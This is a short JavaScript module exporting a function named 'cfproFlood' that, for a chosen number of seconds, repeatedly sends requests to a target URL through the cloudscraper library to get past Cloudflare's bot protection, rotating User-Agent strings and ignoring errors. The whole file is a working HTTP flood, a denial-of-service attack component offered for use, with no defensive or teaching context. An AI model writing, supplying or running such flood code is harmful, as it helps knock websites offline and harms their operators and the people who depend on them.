const axios = require('axios');
const cloudscraper = require('cloudscraper');

async function cfproFlood(url, duration) {
  const end = Date.now() + duration*1000;
  while(Date.now() < end){
    try{
      await cloudscraper.get(url, {
        headers: { 'User-Agent': global.randUA() },
        timeout: 5000
      });
    }catch{}
  }
}
module.exports = { cfproFlood };